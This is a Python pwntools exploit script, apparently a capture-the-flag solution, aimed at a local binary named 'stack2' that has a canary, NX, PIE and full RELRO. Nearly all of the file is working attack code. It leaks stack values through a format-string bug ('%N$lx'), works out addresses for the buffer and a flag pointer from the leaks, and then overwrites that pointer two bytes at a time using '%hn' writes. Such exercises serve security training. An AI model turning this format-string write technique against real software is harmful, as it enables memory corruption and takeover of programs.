#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --libc libc-2.31.so stack2
from threading import stack_size
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("../src/stack2")
context.terminal = ["alacritty", "-e"]
assert exe is not None

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *main+285
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


def get_stack_var(io: process | connect, index: int) -> int:
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"something: ")
    io.sendline(f"%{index}$lx".encode("ascii"))
    io.recvuntil(b"said: ")
    return int(io.recvuntil(b"--", drop=True), 16)


def send_payload(io: process | connect, _payload: bytes):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"something: ")
    io.sendline(_payload)
    io.recvuntil(b"said: ")


def read_flag(io: process | connect):
    io.recvuntil(b"> ")
    io.sendline(b"2")


io = start()

# leaking all the stack vars
# for i in range(1, 50):
#    leak = get_stack_var(io, i)
#    io.info(f"Leaked the {i}th stack var: {hex(leak)}.")

# stack indices
indices = {"rbp": 42, "flag": 7, "buffer": 8, "gadget": 13}
indices["target"] = indices["gadget"] + 1
addrs = {"rbp": 0, "flag": 0, "buffer": 0}

# calculate addresses
addrs["rbp"] = get_stack_var(io, indices["rbp"]) - 0xA0  # a pointer, not the real rbp
addrs["flag"] = addrs["rbp"] - 0x118
addrs["buffer"] = addrs["rbp"] - 0x110
io.success(f"Leaked the saved rbp of main: {hex(addrs['rbp'])}")
io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")

## do exploit
addrs["gadget"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"]))
addrs["target"] = addrs["buffer"] + (8 * (indices["gadget"] - indices["buffer"] + 1))
io.info(
    f"Writing {hex(addrs['target'])} to {hex(addrs['flag'])} @ {hex(addrs['gadget'])}"
)

# the address of the gadget
_t = pack(addrs["target"])
shorts = [_t[i : i + 2] for i in range(0, len(_t), 2)]
for i, short in enumerate(shorts, 0):
    # writing the gadget onto the stack
    payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8) + pack(
        addrs["flag"] + (i * 2)
    )
    send_payload(io, payload)

    # use that gadget to overwrite the flag ptr
    payload = ""
    if unpack(short, 'all') > 0:
        payload = f"%{unpack(short, 'all')}c"
    payload += f"%{indices['gadget']}$hn"
    send_payload(io, payload.encode('ascii'))

io.interactive()
